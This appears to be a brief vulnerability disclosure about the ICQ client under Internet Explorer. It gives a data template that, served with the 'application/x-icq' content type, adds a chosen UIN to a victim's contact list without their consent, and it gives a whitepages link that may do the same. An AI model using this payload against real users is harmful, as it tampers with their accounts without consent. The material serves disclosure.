If the following data is served to a victim's MSIE browser with the 'application/x-icq' Content-Type, &lt;uin&gt; will be added to their contact list.

ICQ User
UIN=&lt;uin&gt;
Email=
NickName=
FirstName=
LastName=

where &lt;uin&gt; is an ICQ UIN

It may be possible to add an arbitrary UIN on some versions of the client using the following link:

http://wwp.icq.com/whitepages/add_me/?uin=&lt;uin&gt;&amp;action=add

where &lt;uin&gt; is the arbitrary UIN to be added to the contact list.
